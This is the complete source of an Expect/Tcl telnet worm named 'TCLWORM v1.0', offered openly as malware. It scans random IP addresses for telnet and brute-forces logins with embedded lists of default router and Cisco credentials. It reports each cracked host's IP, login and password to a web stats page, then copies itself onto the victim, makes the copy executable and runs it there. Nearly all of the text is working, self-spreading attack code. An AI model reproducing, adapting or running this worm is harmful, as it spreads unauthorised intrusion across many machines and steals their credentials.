#!/usr/bin/expect
# TCLWORM v1.0
# by sirius_black
# http://membres.lycos.fr/lotfree

if {[fork]!=0} exit
disconnect

set wget_found 0
set telnet_found 0
set wget_path ""
set telnet_path ""

set liste_telnet {
    "" ""
    admin 1234
    admin admin
    admin "default"
    administrator ""
    Administrator ""
    admin ""
    admin "switch"
    admin synnet
    adm ""
    bbsd-client changeme2
    bbsd-client NULL
    cablecom router
    chochete tiabuena
    debug d.e.b.u.g
    debug synnet
    diag "switch"
    D-Link D-Link
    dream trocse
    echo echo
    guest guest
    login admin
    LUCENT01 UI-PSWD-01
    LUCENT02 UI-PSWD-02
    manager friend
    manager manager
    Manager Manager
    Manager ""
    monitor monitor
    #n/a 1234
    #n/a 14admin
    #n/a admin
    #n/a adtran
    #n/a ascend
    #n/a BRIDGE
    #n/a cisco
    #n/a NetICs
    #n/a ""
    #n/a orinoco
    #n/a password
    #n/a PASSWORD
    #n/a secret
    #n/a secure
    #n/a "Serial Number"
    #n/a speedxess
    #n/a telos
    #netopia netopia
    "" 1234
    "" access
    "" netadmin
    "" ""
    "" root
    operator admin
    operator ""
    read synnet
    root administrator
    root "default"
    !root ""
    root ""
    root par0t
    root pass
    root QNX
    root root
    root tini
    security security
    service smile
    setup ""
    sysadm anicust
    sysadm sysadm
    tech ""
    tech tech
    Telnet ""
    test test
    User ""
    write "private"
    write synnet
}

set liste_cisco {
    "" ""
    admin admin
    admin "default"
    Administrator changeme
    bbsd-client changeme2
    bbsd-client NULL
    cisco cisco
    enable cisco
    #n/a ""
    #n/a admin
    #n/a c
    #n/a cc
    #n/a cisco
    #n/a "Cisco routeur"
    #n/a letmein
    netrangr attack
    ripeop ""
    root attack
}

proc get_random_ip {} {
    set tcl_precision 3
    set ip ""
    append ip [expr round((rand()*1000)/4)]
    for {set i 0} {$i < 3} {incr i 1} {
	append ip "."
	append ip [expr round((rand()*1000)/4)]
    }
    return $ip
}

proc is_telnet_open ip {
    set is_open 0
    if { [catch {set sock [socket $ip 23]} ] } {
	set is_open 0
    } else {
	set is_open 1
	close $sock
    }
    return $is_open
}

proc where_are_progs {} {
    global wget_found
    global telnet_found
    global wget_path
    global telnet_path
    if [file exists "/usr/bin/wget"]==1 {
	set wget_found 1
	set wget_path "/usr/bin/wget"
    }
    if [file exists "/usr/bin/telnet"]==1 {
	set telnet_found 1
	set telnet_path "/usr/bin/telnet"
    }
}

proc whereis_worm {} {
    set worm_path [pwd]
    set file_name [lindex [split [info script] "/"] end]
    append worm_path "/" $file_name
    return $worm_path
}

proc get_content {} {
    set f [open [whereis_worm] "r"]
    set texte ""
    while { ![eof $f] } {
	set ligne [gets $f]
	set ligne [string map {\\ \\\\ \$ \\\$ \` \\\`} $ligne]
	set ligne [string trim $ligne]
	append texte "$ligne\n"
    }
    close $f
    return $texte
}

proc MyIpaddr {} {
    set addr ""
    if {[catch {dns address [info hostname]} addr]} {
        set server [socket -server # 0]
	set port [lindex [fconfigure $server -sockname] 2]
	set host [lindex [fconfigure $server -sockname] 1]
	set client [socket $host $port]
        set addr [lindex [fconfigure $client -sockname] 0]
        close $client
        close $server
    }
    return $addr
}

proc MyNet {} {
    set net ""
    regexp {(.*)\..*} [MyIpaddr] {} net
    return $net
}

proc declare_becane {ip login password} {
    set lheaders "Connection close"
    if {![llength [info commands "::http::geturl"]]} {
	if {[catch {package require http}]} {
	    return "zut"
	}
    }
    ::http::config -useragent "TCLWORM v1.0 (LOTFREE)"
    set htmlUrl "http://localhost:3128/wormstat.php?ip=$ip&login=$login&pass=$password"
    if { [catch { ::http::geturl $htmlUrl} token]} {
	return "zut"
    }
    if { [::http::status $token] != "ok"} {
	return "zut"
    }
    set htmlFile [::http::data $token]
    if { [regexp "haxored" $htmlFile] == 1 } {
	return "next"
    }
    return "go"
}

where_are_progs

set ip ""
while {1==1} {
    set ip [get_random_ip]
    if { [regexp "^127" $ip] == 1 } {
	continue
    }
    if { ![is_telnet_open $ip] } {
	continue
    } else {
	if {$telnet_found == 1} {
	    #on utilise telnet
	    foreach {login passwd} $liste_telnet {
		spawn -noecho $telnet_path $ip 23
		expect {
		    "ogin:" { send "$login\n" }
		    "user:" { send "$login\n" }
		    "imeout" { continue }
		    "ailure" { continue }
		    "nknow host" { continue }
		    "o route to host" { continue }
		    "o adresse associated with name" { continue }
		}
		expect {
		    "incorrect" { continue }
		    "ssword:" { send "$passwd\n" }
		}
		expect {
		    "ast login:" {
			if { [declare_becane $ip $login $passwd] == "next" } {
			send "logout\nexit\n"
			    continue
			} else {
			    exec sleep 2
			    send "cat > tclworm << EOF\n"
			    expect ">"
			    send [get_content]
			    expect ">"
			    send "EOF\n"
			    expect "$"
			    send "chmod +x tclworm\n"
			    expect "$"
			    send "./tclworm\n"
			    expect "$"
			    send "logout\nexit\n"
			    #continue
			}
		    }
		}
	    }
	}
	# fin de on utilise telnet
	continue
    }
}
